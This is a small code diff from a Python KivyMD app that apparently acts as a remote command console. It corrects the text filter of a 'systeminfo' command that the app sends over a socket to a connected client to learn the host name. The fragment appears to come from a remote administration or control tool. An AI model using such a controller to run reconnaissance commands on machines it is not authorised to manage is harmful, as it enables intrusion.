@@ -214,7 +214,7 @@ class Main(MDApp):
             self.root.ids.consoleField.text = ''
 
             # Get Host/Machine Name
-            command = 'systeminfo | findstr /C:"Hostname"'
+            command = 'systeminfo | findstr /C:"Host Name"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
